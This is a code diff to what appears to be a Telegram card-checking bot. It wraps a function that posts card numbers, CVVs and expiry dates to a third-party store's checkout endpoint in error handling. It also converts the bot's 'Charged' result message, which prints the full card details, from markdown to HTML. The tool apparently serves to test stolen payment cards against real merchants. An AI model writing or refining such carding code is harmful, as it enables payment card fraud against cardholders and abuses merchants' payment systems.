@@ -506,7 +506,8 @@ def stripe_charge_gate(card_number, cvv, exp_month, exp_year):
 
 
 async def voucher_pub(card_number, cvv, exp_mo, exp_year):
-    async with ClientSession() as session:
+    try:
+     async with ClientSession() as session:
         await session.post(
             "https://voucherpub.com/wp-admin/admin-ajax.php",
             data={
@@ -585,16 +586,18 @@ async def voucher_pub(card_number, cvv, exp_mo, exp_year):
         else:
             print(response)
             return "Charged", "-", "Voucher has been sent to your email", "✅"
+    except Exception as e:
+        return "Error", "-", str(e), "❌"
 
 
 VOUCHER_PUB = """
-**$ CHARGE-STRIPE_3$**
-**Card:** `{cc}|{exp_mo}|{exp_year}|{cvv}`
-**Result:** `{result}` {emoji}
-**Decline Code:** `{decline_code}`
-**Message:** `{message}`
-**TimeTaken:** `{time}`
-**CheckedBy:** **{checked_by}**
+<b>$ CHARGE-STRIPE_3$</b>
+<b>Card:</b> <code>{cc}|{exp_mo}|{exp_year}|{cvv}</code>
+<b>Result:</b> <code>{result}</code> {emoji}
+<b>Decline Code:</b> <code>{decline_code}</code>
+<b>Message:</b> <code>{message}</code>
+<b>TimeTaken:</b> <code>{time}</code>
+<b>CheckedBy:</b> <b>{checked_by}</b>
 """
 
 
@@ -619,7 +622,7 @@ async def voucherpub(e):
             decline_code=dcode or "-",
             message=msg or "-",
             time=str((datetime.now() - start_time).total_seconds() * 1000) + "ms",
-            checked_by=get_mention(e.sender),
+            checked_by=get_mention(e.sender, "html"),
             emoji=emoji or "-",
         ),parse_mode="html"
     )
